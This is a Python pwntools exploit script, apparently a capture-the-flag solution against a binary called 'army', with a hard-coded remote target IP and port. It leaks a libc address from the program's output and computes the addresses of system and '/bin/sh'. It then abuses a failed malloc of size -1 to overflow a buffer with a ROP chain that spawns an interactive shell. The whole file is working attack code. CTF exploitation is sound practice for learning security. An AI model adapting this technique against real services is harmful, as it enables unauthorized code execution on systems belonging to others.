#! /usr/bin/python

from pwn import *
import sys


def exploit(is_remote):
	global r
	
	if is_remote:
		r = remote('185.168.131.122', 6000)
		libc = ELF('./libc-2.23.so')
		bin_sh_offset = 0x18cd57 # Found it using libc-database
		print 'remote'
	else:
		r = process('./army')
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		bin_sh_offset = 0x1a3f20 # Found it using libc-database
		print 'local'
	
	puts_offset = libc.symbols['puts']
	system_offset = libc.symbols['system']
	pop_rdi_ret = 0x400d03 # pop rdi ; ret
	r.recvuntil('Luck : ')
	''' Leak the address of puts inside libc and use it to calculate libc_base and the address of system and
		'/bin/sh' string in libc.'''
	leaked_address = parse_addr(r.recvline())
	print 'Leaked address:', hex(leaked_address)
	libc_base = leaked_address - puts_offset
	system_address = libc_base + system_offset
	bin_sh_address = libc_base + bin_sh_offset
	print 'libc address:', hex(libc_base)
	print 'system address:', hex(system_address)
	''' Add a soldier with size 0x50 (enough to overwrite ret_addr + 2 qwords). The value of 
		global_answer_length will be 0x50. We then free the soldier (by invoking promotion).'''
	print 'bin_sh address:', hex(bin_sh_address)
	join_the_army('a', 1, 1, 0x50, 'b')
	promotion('a')
	''' Add a soldier with size -1. That way we make malloc fail and global_answer_length will remain 50
		for our buffer overflow.'''
	join_the_army('a', 1, 1, -1, 'b')
	''' Pad the buffer with 'A' untill we reach the return address. Overwrite the return address with a
		"pop rdi; ret" gadget. Give rdi the address of "/bin/sh" in libc and call system.'''
	payload = 'A'*0x38 + p64(pop_rdi_ret) + p64(bin_sh_address) + p64(system_address)
	promotion(payload)
	''' Take controll over the IO and use the shell'''
	r.interactive()
	

def parse_addr(string):
	return u64(string[:8].rstrip('\n').ljust(8, '\x00'))
	
	
def menu():
	global r
	
	r.recvuntil('promotion\n')
	
def join_the_army(name, height, weight, answer_length, description):
	global r
	
	menu()
	r.sendline('1')
	r.sendlineafter('name: ', name)
	r.sendlineafter('height: ', str(height))
	r.sendlineafter('weight: ', str(weight))
	r.sendlineafter('answer: ', str(answer_length))
	if answer_length >= 0:
		r.sendlineafter('description: ', description)
	else:
		r.recvline()
	
	
def print_details():
	global r
	
	menu()
	r.sendline('2')
	return [r.recvline() for _ in range(4)]
	

def promotion(answer):
	global r
	
	menu()
	r.sendline('3')
	r.sendlineafter('answer : ', answer)
	r.recvline()
	

		
if __name__ == '__main__':
	is_remote = True
	if len(sys.argv) > 1:
		if sys.argv[1] in ['-d', '-D']:
			is_remote = False
	exploit(is_remote)